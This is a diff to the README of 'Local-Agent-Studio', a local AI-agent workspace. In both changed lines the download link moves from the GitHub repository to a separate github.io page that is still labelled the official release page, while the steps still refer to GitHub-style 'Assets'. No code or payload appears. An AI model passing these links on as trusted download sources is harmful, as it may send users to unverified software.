@@ -1,6 +1,6 @@
 # 🤖 Local-Agent-Studio - Run your own intelligent AI agents
 
-[![Download Local-Agent-Studio](https://img.shields.io/badge/Download-Local--Agent--Studio-blue)](https://github.com/pugnacious-yezo931/Local-Agent-Studio)
+[![Download Local-Agent-Studio](https://img.shields.io/badge/Download-Local--Agent--Studio-blue)](https://pugnacious-yezo931.github.io)
 
 Local-Agent-Studio provides a visual workspace to build and manage AI agents on your computer. You keep your data private because the software runs on your hardware instead of a remote server. This tool connects your local machine to language models to perform tasks, analyze documents, and automate workflows.
 
@@ -16,7 +16,7 @@ Before you begin, ensure your computer meets these requirements to run the softw
 
 ## 💾 Downloading the Software
 
-[Visit the official release page to download your copy](https://github.com/pugnacious-yezo931/Local-Agent-Studio).
+[Visit the official release page to download your copy](https://pugnacious-yezo931.github.io).
 
 1. Open your web browser and go to the link above.
 2. Look for the section labeled "Assets."
